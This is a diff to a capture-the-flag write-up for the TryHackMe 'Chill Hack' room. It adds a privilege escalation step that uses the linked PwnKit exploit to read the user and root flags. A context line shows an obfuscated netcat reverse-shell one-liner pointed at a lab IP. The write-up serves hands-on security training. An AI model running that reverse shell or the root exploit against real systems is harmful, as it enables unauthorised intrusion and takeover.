@@ -1,4 +1,4 @@
-### Chill hack
+![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/929f86ba-91f5-4278-b53b-555b5afa2985)### Chill hack
 ### Difficulty = easy
 ### Os = linux
 ### [LINK](https://tryhackme.com/room/chillhack)
@@ -59,4 +59,27 @@ rm$IFS/tmp/f;mkfifo$IFS/tmp/f;cat$IFS/tmp/f|/bin/sh -i 2>&1|nc 10.9.3.145 1337 >
 <br> so, stabilize the shell.
 
 <h2>Privilege escalation</h2>
+Enumeration shows that the machine is vulnerable to pwnkit
+using
+```uname -a```
+to confirm
+so, let's move the  pwnkit exploit to the box  and run to gain root ![link](https://github.com/ly4k/PwnKit)
+
+![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/1c570d7a-70dd-4fba-893b-2b5e6ecc9b9e)
+we able to cat the user and root flag
+
+![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/527f7f6d-a1fe-4aa2-95e5-c4ef69df87d0)
+
+that's the unintended way to gain root
+
+
+
+
+so let's go the intended way:
+
+bankai senbonzakura kagyeoshi lol :)
+
+
+
+
 
